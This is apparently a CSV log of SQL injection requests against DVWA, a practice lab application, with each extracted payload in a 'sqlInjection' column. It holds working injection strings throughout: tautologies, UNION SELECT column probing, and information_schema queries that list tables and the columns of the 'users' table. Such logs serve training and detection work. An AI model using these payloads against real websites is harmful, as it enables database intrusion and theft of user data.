ip,url,date,sqlInjection
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+or+1+%3D+1+--&Submit=Submit,15/May/2024:03:20:32,%27+or+1+%3D+1+--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+or+1+%3D+1+%23&Submit=Submit,15/May/2024:03:20:34,%27+or+1+%3D+1+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+union+select+1%2C2%2C3%2C4%2C5&Submit=Submit,15/May/2024:03:20:53,%27+union+select+1%2C2%2C3%2C4%2C5&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+or+1%3D1+%23&Submit=Submit,15/May/2024:03:24:58,%27+or+1%3D1+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7+%23&Submit=Submit,15/May/2024:03:25:23,%27+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4%2C5%2C6%2C7+%23&Submit=Submit,15/May/2024:03:25:30,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4%2C5%2C6%2C7+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4%2C5+%23&Submit=Submit,15/May/2024:03:25:34,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4%2C5+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit,15/May/2024:03:25:37,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit,15/May/2024:03:25:43,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3+%23&Submit=Submit,15/May/2024:03:25:48,%27+union+select+1%2Cdatabase%28%29+%2C3+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit,15/May/2024:03:25:51,%27+union+select+1%2Cdatabase%28%29+%2C3%2C4+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=123%27+union+select+1%2Cdatabase%28%29+%23&Submit=Submit,15/May/2024:03:25:54,%27+union+select+1%2Cdatabase%28%29+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1'%20or%201=1,15/May/2024:03:27:09,'%20or%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20or%201=1,15/May/2024:03:36:27,'%20or%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20or%201=1,15/May/2024:03:36:37,'%20or%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20or%201=1%20--&Submit=Submit,15/May/2024:03:36:43,'%20or%201=1%20--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=%27+or+1%3D1+--&Submit=Submit,15/May/2024:03:36:48,%27+or+1%3D1+--&Submit=Submit
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20--&Submit=Submit",15/May/2024:03:37:14,"'%20union%20select%201,%202,%203%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20--&Submit=Submit",15/May/2024:03:37:36,"'%20union%20select%201,%202,%203%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204%20--&Submit=Submit",15/May/2024:03:38:24,"'%20union%20select%201,%202,%203,%204%20--&Submit=Submit"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201--&Submit=Submit,15/May/2024:03:47:31,'%20union%20select%201--&Submit=Submit
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203,%204--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203,%204,%205--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203,%204,%205,%206--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207--&Submit=Submit",15/May/2024:03:47:31,"'%20union%20select%201,%202,%203,%204,%205,%206,%207--&Submit=Submit"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,15/May/2024:03:48:17,'%20union%20select%201
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202",15/May/2024:03:48:17,"'%20union%20select%201,%202"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204,%205"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204,%205,%206"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207",15/May/2024:03:48:17,"'%20union%20select%201,%202,%203,%204,%205,%206,%207"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201--&Submit=Submit,15/May/2024:03:48:38,'%20union%20select%201--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201--&Submit=Submit,15/May/2024:03:48:49,'%20union%20select%201--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20--%20&Submit=Submit,15/May/2024:03:50:11,'%20union%20select%201%20--%20&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:51:17,'%20union%20select%201%20
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:51:21,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:51:33,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1+--&Submit=Submit,15/May/2024:03:51:52,%27+OR+1%3D1+--&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli_blind/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:51:54,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:52:26,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:52:53,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:52:58,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:03:53:04,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:53:08,'%20union%20select%201%20
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:53:59,'%20union%20select%201%20
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:54:20,'%20union%20select%201%20
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202%20",15/May/2024:03:54:20,"'%20union%20select%201,%202%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203,%204%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203,%204,%205%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203,%204,%205,%206%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207%20",15/May/2024:03:54:20,"'%20union%20select%201,%202,%203,%204,%205,%206,%207%20"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20--&Submit=Submit,15/May/2024:03:54:32,'%20union%20select%201%20--&Submit=Submit
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203,%204%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203,%204,%205%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203,%204,%205,%206%20--&Submit=Submit"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207%20--&Submit=Submit",15/May/2024:03:54:32,"'%20union%20select%201,%202,%203,%204,%205,%206,%207%20--&Submit=Submit"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id='%20union%20select%201%20,15/May/2024:03:54:51,'%20union%20select%201%20
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202%20",15/May/2024:03:54:51,"'%20union%20select%201,%202%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204,%205%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204,%205,%206%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204,%205,%206,%207%20"
192.168.36.1,"/dvwa/vulnerabilities/sqli/?id='%20union%20select%201,%202,%203,%204,%205,%206,%207,%208%20",15/May/2024:03:54:51,"'%20union%20select%201,%202,%203,%204,%205,%206,%207,%208%20"
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:43:33,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:43:42,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:43:44,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6'%20OR%201=1,15/May/2024:04:44:49,'%20OR%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6'%27OR%271=1,15/May/2024:04:45:06,'%27OR%271=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6'%20OR%201=1,15/May/2024:04:45:13,'%20OR%201=1
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23,15/May/2024:04:46:11,%27+OR+1%3D1%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23,15/May/2024:04:46:34,%27+OR+1%3D1%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=6%27+OR+1%3D1%23,15/May/2024:04:46:47,%27+OR+1%3D1%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit%23,15/May/2024:04:47:04,%27+OR+1%3D1%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%23&Submit=Submit%23,15/May/2024:04:47:36,%27+union+select+database%28%29%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29&Submit=Submit%23,15/May/2024:04:47:40,%27+union+select+database%28%29&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29+%23&Submit=Submit%23,15/May/2024:04:47:47,%27+union+select+database%28%29+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2+%23&Submit=Submit%23,15/May/2024:04:47:53,%27+union+select+database%28%29%2C1%2C2+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3+%23&Submit=Submit%23,15/May/2024:04:47:58,%27+union+select+database%28%29%2C1%2C2%2C3+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23,15/May/2024:04:48:04,%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23,15/May/2024:04:48:08,%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4%2C5%2C6+%23&Submit=Submit%23,15/May/2024:04:48:13,%27+union+select+database%28%29%2C1%2C2%2C3%2C4%2C5%2C6+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4%2C5+%23&Submit=Submit%23,15/May/2024:04:48:17,%27+union+select+database%28%29%2C1%2C2%2C3%2C4%2C5+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23,15/May/2024:04:48:20,%27+union+select+database%28%29%2C1%2C2%2C3%2C4+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2%2C3+%23&Submit=Submit%23,15/May/2024:04:48:24,%27+union+select+database%28%29%2C1%2C2%2C3+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1%2C2+%23&Submit=Submit%23,15/May/2024:04:48:29,%27+union+select+database%28%29%2C1%2C2+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1+%23&Submit=Submit%23,15/May/2024:04:48:32,%27+union+select+database%28%29%2C1+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:48:55,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=5%27+OR+1%3D1%23&Submit=Submit,15/May/2024:04:49:01,%27+OR+1%3D1%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+database%28%29%2C1+%23&Submit=Submit,15/May/2024:04:49:27,%27+union+select+database%28%29%2C1+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+name%2C+2+from+dvwa+%23&Submit=Submit%23,15/May/2024:04:50:28,%27+union+select+name%2C+2+from+dvwa+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+2+from+information_schema.tables&Submit=Submit%23,15/May/2024:04:50:56,%27+union+select+1%2C+2+from+information_schema.tables&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+table_name+from+information_schema.tables&Submit=Submit%23,15/May/2024:04:51:07,%27+union+select+1%2C+table_name+from+information_schema.tables&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+table_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit%23,15/May/2024:04:51:25,%27+union+select+1%2C+table_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+table_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit,15/May/2024:04:51:33,%27+union+select+1%2C+table_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit%23,15/May/2024:04:52:35,%27+union+select+1%2C+column_name+from+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:53:00,%27+union+select+1%2C+column_name+from+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:53:22,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:00,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:12,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:15,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:25,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:55:56,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:56:17,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:57:38,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:57:58,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:58:08,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:58:56,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:04:59:38,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:05:00:19,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:05:00:46,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27guestbook%27+%23&Submit=Submit%23,15/May/2024:05:01:30,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27guestbook%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27guestbook%27+%23&Submit=Submit%23,15/May/2024:05:01:47,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27guestbook%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:05:01:53,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:05:02:50,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:06:15:21,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
192.168.36.1,/dvwa/vulnerabilities/sqli/?id=1%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23,15/May/2024:06:15:24,%27+union+select+1%2C+column_name+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit%23
